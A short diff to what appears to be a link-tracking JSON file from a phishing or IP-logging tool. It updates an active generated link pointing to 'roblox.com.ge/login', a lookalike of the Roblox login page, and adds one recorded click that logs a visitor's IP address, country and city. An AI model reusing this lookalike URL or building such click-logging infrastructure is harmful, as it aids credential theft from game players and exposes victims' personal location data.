@@ -14301,8 +14301,17 @@
     "targetUrl": "https://www.roblox.com.ge/login",
     "createdAt": 1778858732473,
     "status": "active",
-    "useCount": 0,
+    "useCount": 1,
     "createdBy": "generator",
-    "clicks": []
+    "clicks": [
+      {
+        "timestamp": 1778858740223,
+        "ip": "175.176.27.176",
+        "country": "Philippines",
+        "city": "Quezon City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      }
+    ]
   }
 ]
